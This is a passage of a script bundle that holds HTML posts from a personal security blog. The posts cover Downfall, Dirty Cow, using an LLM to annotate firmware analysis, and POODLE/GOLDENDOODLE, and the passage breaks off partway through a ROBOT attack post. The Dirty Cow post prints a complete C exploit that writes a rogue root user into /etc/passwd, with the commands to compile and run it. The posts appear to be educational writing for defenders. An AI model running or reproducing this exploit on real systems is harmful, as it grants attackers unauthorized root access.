          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Jh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Zh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,em=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,nm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
